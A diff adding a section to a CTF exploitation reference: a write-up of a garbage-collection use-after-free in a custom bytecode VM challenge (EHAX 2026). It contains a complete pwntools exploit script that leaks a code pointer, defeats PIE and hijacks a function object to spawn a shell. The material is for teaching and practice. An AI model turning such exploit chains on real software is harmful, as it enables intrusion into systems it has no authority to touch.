@@ -29,6 +29,7 @@
 - [Canary-Aware Partial Overflow](#canary-aware-partial-overflow)
 - [Global Buffer Overflow (CSV Injection)](#global-buffer-overflow-csv-injection)
 - [MD5 Preimage Gadget Construction](#md5-preimage-gadget-construction)
+- [VM GC-Triggered UAF — Slab Reuse (EHAX 2026)](#vm-gc-triggered-uaf-slab-reuse-ehax-2026)
 - [Path Traversal Sanitizer Bypass](#path-traversal-sanitizer-bypass)
 - [FSOP + Seccomp Bypass via openat/mmap/write (EHAX 2026)](#fsop--seccomp-bypass-via-openatmmapwrite-ehax-2026)
 - [Kernel Exploitation](#kernel-exploitation)
@@ -592,6 +593,74 @@ for (uint64_t ctr = 0; ; ctr++) {
 **Pre-computation approach:** Build lookup table mapping MD5 4-byte prefixes to inputs. At runtime, parse win() address from server banner, look up matching push-hash input.
 
 **Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.
+
+## VM GC-Triggered UAF — Slab Reuse (EHAX 2026)
+
+**Pattern (SarcAsm):** Custom stack-based VM with NEWBUF/SLICE/GC/BUILTIN opcodes. Slicing a buffer creates a shared reference to the same slab. When the slice is dropped and GC'd, it frees the shared slab even though the parent buffer is still alive.
+
+**Vulnerability:** `free_data()` called on slice frees the underlying slab pointer that the parent buffer still references → UAF read/write through parent.
+
+**Exploit chain:**
+1. `NEWBUF 24` → allocates 32-byte slab (slab class matches function objects)
+2. `READ 24` → fills buffer, sets length so SLICE bounds check passes
+3. `SLICE 0,24` → alias to same slab
+4. `DROP` + `GC` → frees the slab via slice's destructor
+5. `BUILTIN 0` → allocates function object, reuses freed 32-byte slab (code pointer at offset +8)
+6. `WRITEBUF 16,0` → sets parent buffer's length to 16 (no actual write, bypasses bounds)
+7. `PRINTB` → leaks code pointer from UAF slab → compute PIE base
+8. `READ 16` → overwrites code pointer with `win()` address
+9. `CALL` → executes `win()` → `execve("/bin/sh")`
+
+```python
+from pwn import *
+import struct
+
+# ULEB128 encoding for VM immediates
+def uleb128(val):
+    result = b''
+    while True:
+        byte = val & 0x7f
+        val >>= 7
+        if val: byte |= 0x80
+        result += bytes([byte])
+        if not val: break
+    return result
+
+# Opcodes
+NEWBUF, READ, SLICE, DROP, GC = b'\x20', b'\x21', b'\x22', b'\x04', b'\x60'
+BUILTIN, CALL, GLOAD, GSTORE = b'\x40', b'\x41', b'\x30', b'\x31'
+WRITEBUF, PRINTB, PUSH, HALT = b'\x25', b'\x23', b'\x01', b'\xff'
+
+code = b''
+code += NEWBUF + uleb128(24) + GSTORE + uleb128(0)  # buf A in slot 0
+code += GLOAD + uleb128(0) + READ + uleb128(24)      # fill to set length
+code += GLOAD + uleb128(0) + SLICE + uleb128(0) + uleb128(24)  # slice
+code += DROP + GC                                      # free slab via slice
+code += BUILTIN + uleb128(0) + GSTORE + uleb128(1)   # func F reuses slab
+code += GLOAD + uleb128(0) + WRITEBUF + uleb128(16) + uleb128(0)  # set len=16
+code += GLOAD + uleb128(0) + PRINTB                    # leak code ptr
+code += GLOAD + uleb128(0) + READ + uleb128(16)       # overwrite code ptr
+code += PUSH + b'\x00' + GLOAD + uleb128(1) + CALL + uleb128(1)  # call win
+code += HALT
+
+blob = struct.pack('<I', len(code)) + code
+p = remote('target', 9999)
+p.send(blob + b'A'*24)          # blob + dummy READ data
+leak = p.recv(16, timeout=5)
+code_ptr = struct.unpack('<Q', leak[:8])[0]
+win_addr = (code_ptr - 0x31d0) + 0x3000  # PIE base + win offset
+p.send(struct.pack('<Q', win_addr) + b'\x00'*8)
+p.sendline(b'cat /flag*')
+p.interactive()
+```
+
+**Key lessons:**
+- **Slab allocator reuse:** Function objects and buffer data share the same slab size class → guaranteed UAF overlap
+- **WRITEBUF length trick:** Setting length without writing data bypasses bounds checks but exposes UAF content
+- **GC as trigger:** Explicit `GC` opcode forces immediate collection → deterministic UAF timing
+- **General pattern:** In custom VMs, look for shared references (slices, views, aliases) where destruction of one frees resources still held by another
+
+---
 
 ## Path Traversal Sanitizer Bypass
 
